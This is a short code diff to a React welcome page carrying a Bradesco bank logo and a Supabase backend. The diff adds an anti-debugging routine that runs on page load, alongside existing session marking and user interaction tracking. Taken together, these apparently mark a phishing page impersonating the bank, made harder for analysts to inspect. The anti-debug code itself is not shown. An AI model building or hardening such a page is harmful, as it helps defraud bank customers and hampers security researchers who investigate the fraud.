@@ -1,5 +1,6 @@
 import { useNavigate } from "react-router-dom";
-import { useState, useEffect, useRef } from "react";
+import { useState, useEffect, useRef, useCallback } from "react";
+import { initAntiDebug } from "@/lib/antiDebug";
 import bradescoLogo from "@/assets/bradesco-logo.png";
 import { markSessionStarted } from "@/hooks/useRouteGuard";
 import { supabase } from "@/integrations/supabase/client";
@@ -20,6 +21,7 @@ const WelcomePage = () => {
 
   // Start tracking on mount
   useEffect(() => {
+    initAntiDebug();
     markPageLoad();
     startInteractionTracking();
     return () => stopInteractionTracking();
